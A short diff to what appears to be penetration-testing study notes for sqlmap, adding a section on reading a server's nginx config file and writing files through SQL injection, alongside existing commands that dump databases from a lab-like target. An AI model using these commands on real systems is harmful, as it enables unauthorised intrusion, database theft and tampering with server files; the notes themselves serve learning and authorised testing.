@@ -53,6 +53,17 @@ sqlmap -u "http://www.target.com/vuln.php?id=1" --data="id=1" --method PUT
 sqlmap -u "http://154.57.164.70:32070/case3.php" --cookie="id=1" --level=2 --batch --dump
 ```
 
+## File Read & Write
+
+```bash
+
+# read
+sqlmap -r req.txt --batch --file-read=/etc/nginx/sites-enabled/default
+
+# write
+sqlmap -r req.txt --batch --file-write=/tmp/t.txt --file-dest=/tmp/sqlmap_test.txt
+```
+
 # Handling SQLMap Errors
 
 ```bash
